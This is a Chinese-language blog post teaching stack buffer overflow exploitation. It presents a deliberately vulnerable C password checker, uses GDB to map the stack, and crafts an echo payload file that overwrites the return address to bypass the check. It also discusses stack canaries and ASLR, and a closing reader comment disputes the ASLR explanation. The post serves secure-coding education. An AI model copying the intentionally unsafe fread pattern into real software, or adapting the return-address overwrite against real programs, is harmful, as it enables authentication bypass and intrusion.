---
title: 利用缓冲区溢出漏洞Hack应用
url: https://tonybai.com/2011/12/01/hack-app-by-buffer-overflow-leak/
published: '2011-12-01'
source_blog: Tony Bai
source_site: https://tonybai.com
category: game programming
fetched: '2026-04-13'
---

# 利用缓冲区溢出漏洞Hack应用

我们在平时编码过程中很少考虑代码的安全性(security)，与正确性、高性能和可移植性相比，安全性似乎总被忽略。昨天从安全性角度泛泛地Review了一下现有的代码，发现了不少具有安全隐患的地方。我们的程序员的确缺乏系统地有关安全编码方面的训练和实践，包括我在内，在安全编码方面也都是初级选手，脑子中对安全性编码缺乏系统的理解。

市面上讲解编码安全性方面的书籍也不是很多，在[C编码安全性](http://www.securecoding.cert.org/confluence/display/seccode/CERT+C+Secure+Coding+Standard)方面，[CERT](http://www.cert.org/)(Carnegie Mellon University's Computer Emergency Response Team)专家Robert Seacord的《[C和C++安全编码](http://book.douban.com/subject/4136222)》一书对安全性编码方面做了比较系统的讲解。Robert还编写了一本名为《[C安全编码标准](http://book.douban.com/subject/4149534)》的书，这本书可以作为指导安全编码实践的参考手册。

浏览了一下《C和C++安全编码》，你会发现多数漏洞(vulnerability)都与缓冲区溢出(buffer overflow)有关。要想学会更好的防守，就要弄清楚漏洞是如何被利用的，在这里我们就来尝试一下如何利用缓冲区漏洞Hack应用。

有这样一段应用代码：

/* bufferoverflow.c */

int ispasswdok() {

char passwd[12];

memset(passwd, 0, sizeof(passwd));

FILE *p = fopen("passwd", "rb");

fread(passwd, 1, 200, p);

fclose(p);

if (strcmp(passwd, "123456") == 0) {

return 0;

} else {

return -1;

}

}

int main() {

int passwdstat = -1;

passwdstat = ispasswdok();

if (passwdstat != 0) {

printf ("invalid!\n");

return -1;

}

printf("granted!\n");

return 0;

}

这显然是故意“制造”的一段程序。原本密码(passwd)的输入是通过gets函数从标准输入获得的，但考虑到Hack时非可显示的ASCII码不易展示和输入，这里换成了fread，并且故意在fread使用中留下了隐患。我们Hack的目标很明确，就是在不知道密码的前提下，让这个程序输出"granted!"，即绕过密码校验逻辑。

Hack的原理这里简述一下。我们知道C程序的运行其实就是一系列的过程调用，而过程调用本身是依赖系统为程序建立的运行时堆栈(stack)的，每个过程(Procedure)都有自己的栈帧(stack frame)，各个过程的栈帧在运行时stack上按照调用的先后顺序从栈底向栈顶延伸排列。系统使用扩展基址寄存器(extended base pointer，%ebp)和扩展栈寄存器(extended stack pointer，%esp)来指示当前过程的栈帧。系统通过调整%ebp和%esp的方式按照特定的机制在各个过程的栈帧上切换，实现过程调用(call)和从过程调用返回(ret)。

执行子过程调用指令(call)时，系统先将该call指令的下一条顺序指令的地址(%eip)，即子过程调用的返回地址存储在stack上，作为过程调用者栈帧的结尾，然后将%ebp也压入stack，作为子过程栈帧的开始，最后系统跳转到子过程的起始地址开始执行。总的来说，子过程调用call的执行相当于：

push %eip

push %ebp

子过程在其开始处将调用者的%ebp保存在栈上，并建立自己的%ebp；子过程调用结束前，leave指令首先恢复调用者的%ebp和%esp，之后ret指令将存储在stack的调用者的返回地址恢复到指令寄存器%eip中，并跳转到该地址上执行后续指令，这样系统就从子过程返回继续原过程的执行了。

这里的Hack就是利用重写返回地址来达到绕过密码校验过程的目的。返回地址与局部变量存储在同一栈上且系统没有对栈越界修改进行校验(一般情况是这样的)让Hack成为可能。我们通过GDB反汇编来看看main栈帧与ispasswdok栈帧在内存中的布局情况。

我们首先将breakpoint设置在ispasswdok过程被调用前，设置断点后run：

$ gdb bufferoverflow

… …

(gdb) break 20

Breakpoint 1 at 0×8048591: file bufferoverflow.c, line 20.

(gdb) run

Starting program: /home/tonybai/test/c/bufferoverflow

Breakpoint 1, main () at bufferoverflow.c:20

20 int passwdstat = -1;

我们查看一下当前main的栈帧情况：

(gdb) info registers

esp 0xbffff100 0xbffff100

ebp 0xbffff128 0xbffff128

eip 0×8048591 0×8048591 [main+9]

可以看到main栈帧起始于0xbffff128。我们继续在ispasswdok处设置断点，继续执行。

(gdb) break ispasswdok

Breakpoint 2 at 0x804850a: file bufferoverflow.c, line 6.

(gdb) continue

Continuing.

Breakpoint 2, ispasswdok () at bufferoverflow.c:6

6 memset(passwd, 0, sizeof(passwd));

现在程序已经执行到ispasswdok过程中，我们也可以看到ispasswdok栈帧情况了：

(gdb) info registers

esp 0xbffff0d0 0xbffff0d0

ebp 0xbffff0f8 0xbffff0f8

eip 0x804850a 0x804850a [ispasswdok+6]

可以看到ispasswdok过程的栈帧起始于0xbffff0f8。前面说过子过程的%ebp指向的栈单元存储的是其调用者栈帧的起始地址，即其调用者的%ebp。我们来查看一下是否是这样：

(gdb) x/4wx 0xbffff0f8

0xbffff0f8: 0xbffff128 0x0804859e 0×00284324 0x00283ff4

我们通过x/命令查看起始地址为0xbffff0f8的栈上连续4个4字节存储单元的值，可以看到0xbffff0f8处栈单元内的确存储是的main栈帧的%ebp，其值与前面main栈帧输出的结果相同。那么按照之前所说的，紧挨着这个地址的值就应该是ispasswdok过程调用的返回地址了，也就是我们要改写的那个地址，我们看到这个地址的值为0x0804859e。我们通过反汇编看看main过程的指令：

(gdb) disas main

Dump of assembler code for function main:

0×08048588 [+0]: push %ebp

0×08048589 [+1]: mov %esp,%ebp

0x0804858b [+3]: and $0xfffffff0,%esp

0x0804858e [+6]: sub $0×20,%esp

0×08048591 [+9]: movl $0xffffffff,0x1c(%esp)

0×08048599 [+17]: call 0×8048504 [ispasswdok]

0x0804859e [+22]: mov %eax,0x1c(%esp)

… …

可以看到0x0804859e就是ispasswdok调用后的下一条指令，看来它的确是我们想要找到地址。找到了要改写的地址，我们还要找到外部数据的入口，这个入口即是ispasswdok过程中的局部变量passwd。

passwd的起始地址是什么？我们通过ispasswdok的反汇编代码来分析：

(gdb) disas ispasswdok

Dump of assembler code for function ispasswdok:

0×08048504 [+0]: push %ebp

0×08048505 [+1]: mov %esp,%ebp

… …

0×08048555 [+81]: lea -0×18(%ebp),%eax

0×08048558 [+84]: mov %eax,(%esp)

0x0804855b [+87]: call 0x804842c [fread@plt]

… …

可以看到在为fread准备实际参数时，系统用了-0×18(%ebp)，显然这个地址就是passwd数组的始地址，即0xbffff0f8 – 0×18处。综上，我们用一幅简图来形象的说明一下各个重要元素：

– 高地址，栈底

… …

0xbffff0fc: 0x0804859e <- 存储的值是main设置的ispasswdok过程的返回地址

——————————————————

0xbffff0f8: 0xbffff128 <- ispasswdok的%ebp，存储的值为main的%ebp

0xbffff0f4: 0x08049ff4

0xbffff0f0: 0x0011e0c0

0xbffff0ec: 0x0804b008

0xbffff0e8: 0×00000000

0xbffff0e4: 0×00000000

0xbffff0e0: 0×00000000 <- passwd数组的起始地址

… …

– 低地址，栈顶

我们现在需要做的就是从0xbffff0e0这个地址开始写入数据，一直写到ispasswdok过程的返回地址，用新的地址值覆盖掉原有的返回地址0x0804859e。我们需要精心构造一个密码文件(passwd)：

echo -ne "aaaaaaaaaaaa\x08\xb0\x04\x08\xc0\xe0\x11\x00\xf4\x9f\x04\x08\x28\xf1\xff\xbf\xc4\x85\x04\x08" > passwd

这里我们将passwd数组用字符'a'填充，将0x0804859e这个返回地址改写为0x080485c4，我们通过disas main可以看到这个跳转地址对应的指令：

(gdb) disas main

Dump of assembler code for function main:

0×08048590 [+0]: push %ebp

0×08048591 [+1]: mov %esp,%ebp

… …

0x080485c4 [+52]: movl $0x80486ba,(%esp) ;程序执行跳转到这里

0x080485cb [+59]: call 0x804841c [puts@plt] ; 输出granted!

0x080485d0 [+64]: mov $0×0,%eax

0x080485d5 [+69]: leave

0x080485d6 [+70]: ret

我们在GDB中完整的执行一遍bufferoverflow：

$ gdb bufferoverflow

(gdb) run

Starting program: /home/tonybai/test/c/bufferoverflow

granted!

Program exited normally.

Hack成功！(环境：gcc version 4.4.3 (Ubuntu 4.4.3-4ubuntu5), GNU gdb (GDB) 7.1-ubuntu)

GCC默认在目标代码中加入stack smashing protector(-fstack-protector)，在函数返回前，程序会检测特定的protector(又被称为canary，金丝雀)的值是否被修改，如果被修改了，则报错退出。上面的代码在编译时加入了-fno-stack-protector，否则一旦越界修改缓冲区外的地址，波及canary，程序就会报错退出。

另外bufferoverflow这个程序在GDB下执行可以成功Hack，但在shell下独立执行依旧会报错，dump core（发生在fclose里），对于此问题暂没有什么头绪。

后记：

经过分析，bufferoverflow程序在非GDB调试环境下独立执行时dump core的问题应该是由于Linux采用的[ASLR](http://en.wikipedia.org/wiki/Address_space_layout_randomization)技术所致。所谓ASLR就是Address-Space Layout Randomization，中文意思是地址空间布局随机化。正因为每次bufferoverflow的栈地址空间布局随机不同，因此事先精心挑选的那组hack数据才无法起到作用，并导致栈被破坏而dump core。

我们可以通过一个简单的测试程序看到ASLR的作用。

/* test_aslr.c */

int main() {

int a;

printf("a is at %p\n", &a);

return 0;

}

下面多次执行该例程：

tonybai@PC-ubuntu:~/test/c$ test_aslr

a is at 0xbfbcb44c

tonybai@PC-ubuntu:~/test/c$ test_aslr

a is at 0xbfe3c8cc

tonybai@PC-ubuntu:~/test/c$ test_aslr

a is at 0xbfcc6d9c

tonybai@PC-ubuntu:~/test/c$ test_aslr

a is at 0xbfaea32c

可以看到每次栈上变量a的地址都不相同。

GDB默认关闭了ASLR，这才使得上面的Hack得以成型，通过GDB的信息也可以证实这一点：

(gdb) show disable-randomization

Disabling randomization of debuggee's virtual address space is on.

© 2011, [bigwhite](https://tonybai.com). 版权所有.

Related posts:

不对吧，栈地址随机也不会影响这个溢出攻击啊。因为黑的是eip地址，而eip地址不会变啊，除非改了程序重新编译。